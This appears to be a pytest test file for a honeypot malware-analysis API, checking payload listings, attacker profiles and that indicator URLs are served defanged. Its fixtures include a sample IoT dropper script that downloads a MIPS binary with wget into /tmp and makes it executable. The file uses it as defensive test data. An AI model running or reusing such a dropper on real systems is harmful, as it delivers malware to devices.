"""API-level tests for the payload endpoints.

These drive the real FastAPI app against a temp database, so they cover the
schema boundary as well as the routes: a field that exists on the ORM model but
was never added to ``PayloadOut`` silently disappears from the response, and
only a test that reads the JSON notices.

The defanging assertion is repeated here on purpose. It is already tested at
the analyser and at the database, but this is the layer that reaches a browser
— the one place where a re-fanged indicator would become a clickable link to a
malware host.
"""

from __future__ import annotations

import struct

import pytest
from fastapi.testclient import TestClient

from pipeline.analysis import store
from storage.db import get_engine, init_db, reset_state, session_scope
from storage.models import Event, EventType, Severity, utcnow

SCRIPT = b"#!/bin/sh\ncd /tmp\nwget http://198.51.100.9/bins/x.mips\nchmod +x x.mips\n"


def mips_elf() -> bytes:
    header = bytearray(52)
    header[0:4] = b"\x7fELF"
    header[4], header[5], header[6], header[7] = 1, 2, 1, 3
    struct.pack_into(">HH", header, 16, 2, 0x08)
    struct.pack_into(">I", header, 20, 1)
    struct.pack_into(">I", header, 28, 52)
    struct.pack_into(">I", header, 32, 52 + 32)
    struct.pack_into(">HH", header, 42, 32, 1)
    struct.pack_into(">HH", header, 46, 40, 1)
    ph = bytearray(32)
    struct.pack_into(">I", ph, 0, 1)
    sh = bytearray(40)
    struct.pack_into(">I", sh, 4, 1)
    return bytes(header + ph + sh) + b"/bin/busybox\x00"


@pytest.fixture
def seeded(tmp_path, monkeypatch):
    """A database holding two analysed artefacts, one of them delivered twice."""
    import hashlib
    import uuid

    monkeypatch.setenv("DATABASE_URL", f"sqlite:///{(tmp_path / 'api.db').as_posix()}")
    reset_state()
    init_db(get_engine())

    directory = tmp_path / "payloads"
    directory.mkdir()
    digests = {}
    for name, data in (("elf", mips_elf()), ("script", SCRIPT)):
        digest = hashlib.sha256(data).hexdigest()
        (directory / f"{digest}.bin").write_bytes(data)
        digests[name] = digest

    now = utcnow()
    with session_scope() as db:
        for src_ip in ("45.33.32.10", "45.33.32.10", "8.8.8.8"):
            db.add(
                Event(
                    event_id=str(uuid.uuid4()),
                    ts=now,
                    sensor="t",
                    service="http",
                    event_type=EventType.FILE_UPLOAD.value,
                    severity=Severity.CRITICAL.value,
                    src_ip=src_ip,
                    dst_port=80,
                    payload_sha256=digests["elf"],
                    tags=[],
                    threat_tags=[],
                    extra={},
                )
            )
    with session_scope() as db:
        store.scan_and_store(db, directory)

    # The attacker profile reads the aggregate table, not raw events, so it
    # has to be built or every profile request is a 404.
    from storage import queries

    with session_scope() as db:
        queries.rebuild_attackers(db)

    yield digests
    reset_state()


@pytest.fixture
def client(seeded):
    from api.main import app

    with TestClient(app) as c:
        c.digests = seeded  # type: ignore[attr-defined]
        yield c


# --------------------------------------------------------------------------- #
# Listing
# --------------------------------------------------------------------------- #


class TestListEndpoint:
    def test_lists_analysed_payloads(self, client):
        body = client.get("/api/payloads").json()
        assert body["total"] == 2
        assert len(body["items"]) == 2

    def test_item_carries_the_analysis(self, client):
        body = client.get("/api/payloads?file_type=elf").json()
        item = body["items"][0]
        assert item["arch"] == "mips"
        assert item["linkage"] == "static"
        assert item["stripped"] is True
        assert "iot:busybox" in item["behaviour_tags"]

    def test_format_details_survive_the_schema_boundary(self, client):
        item = client.get("/api/payloads?file_type=elf").json()["items"][0]
        assert item["format_details"]["endianness"] == "big"

    def test_filter_by_arch(self, client):
        assert client.get("/api/payloads?arch=mips").json()["total"] == 1
        assert client.get("/api/payloads?arch=x86-64").json()["total"] == 0

    def test_filter_by_behaviour_tag(self, client):
        body = client.get("/api/payloads?behaviour_tag=downloader:wget").json()
        assert body["total"] == 1
        assert body["items"][0]["file_type"] == "script-sh"

    def test_packed_only(self, client):
        assert client.get("/api/payloads?packed_only=true").json()["total"] == 0

    def test_pagination_envelope(self, client):
        body = client.get("/api/payloads?limit=1&offset=0").json()
        assert body["total"] == 2
        assert body["limit"] == 1 and body["offset"] == 0
        assert len(body["items"]) == 1

    def test_bad_sort_is_a_400_not_a_500(self, client):
        response = client.get("/api/payloads?sort=drop_table")
        assert response.status_code == 400
        assert "cannot sort by" in response.json()["detail"]

    def test_limit_is_bounded(self, client):
        assert client.get("/api/payloads?limit=99999").status_code == 422


# --------------------------------------------------------------------------- #
# Detail
# --------------------------------------------------------------------------- #


class TestDetailEndpoint:
    def test_returns_the_profile(self, client):
        sha = client.digests["elf"]
        body = client.get(f"/api/payloads/{sha}").json()
        assert body["sha256"] == sha
        assert body["arch"] == "mips"

    def test_lists_the_sources_that_delivered_it(self, client):
        body = client.get(f"/api/payloads/{client.digests['elf']}").json()
        by_ip = {s["src_ip"]: s for s in body["sources"]}
        assert set(by_ip) == {"45.33.32.10", "8.8.8.8"}
        assert by_ip["45.33.32.10"]["events"] == 2

    def test_artefact_with_no_sightings_has_an_empty_source_list(self, client):
        body = client.get(f"/api/payloads/{client.digests['script']}").json()
        assert body["sources"] == []
        assert body["event_count"] == 0

    def test_unknown_digest_is_404(self, client):
        assert client.get(f"/api/payloads/{'a' * 64}").status_code == 404

    def test_malformed_digest_is_400(self, client):
        assert client.get("/api/payloads/not-a-hash").status_code == 400

    def test_uppercase_digest_is_accepted(self, client):
        sha = client.digests["elf"]
        assert client.get(f"/api/payloads/{sha.upper()}").status_code == 200


class TestArchitectureBreakdown:
    def test_counts_per_cpu_family(self, client):
        body = client.get("/api/payloads/architectures").json()
        assert body == [{"arch": "mips", "count": 1}]

    def test_route_is_not_shadowed_by_the_digest_route(self, client):
        # "/architectures" must not be parsed as a sha256 and 400.
        assert client.get("/api/payloads/architectures").status_code == 200


# --------------------------------------------------------------------------- #
# The attacker profile join
# --------------------------------------------------------------------------- #


class TestAttackerProfileIntegration:
    def test_payloads_appear_on_the_attacker_profile(self, client):
        body = client.get("/api/attackers/45.33.32.10").json()
        assert [p["sha256"] for p in body["payloads"]] == [client.digests["elf"]]

    def test_the_same_artefact_is_listed_once(self, client):
        # Delivered twice by this source; the profile shows one artefact.
        body = client.get("/api/attackers/45.33.32.10").json()
        assert len(body["payloads"]) == 1

    def test_field_is_present_even_when_there_is_nothing_to_show(self, client):
        # The frontend renders off the list's length, so the key must always
        # exist. 203.0.113.99 never uploaded anything.
        body = client.get("/api/attackers/8.8.8.8").json()
        assert body["payloads"] != []  # this one did upload
        assert client.get("/api/attackers/203.0.113.99").status_code == 404


# --------------------------------------------------------------------------- #
# The defanging contract, at the layer that reaches a browser
# --------------------------------------------------------------------------- #


class TestServedIndicatorsAreDefanged:
    def test_list_response_carries_no_live_url(self, client):
        for item in client.get("/api/payloads").json()["items"]:
            for values in item["iocs"].values():
                for value in values:
                    assert not value.startswith("http")

    def test_detail_response_carries_no_live_url(self, client):
        body = client.get(f"/api/payloads/{client.digests['script']}").json()
        assert body["iocs"]["urls"] == ["hxxp://198[.]51[.]100[.]9/bins/x[.]mips"]

    def test_raw_response_text_contains_no_fetchable_scheme(self, client):
        # Belt and braces: scan the serialised body, not just the parsed field.
        text = client.get("/api/payloads").text
        assert "http://" not in text
        assert "https://" not in text
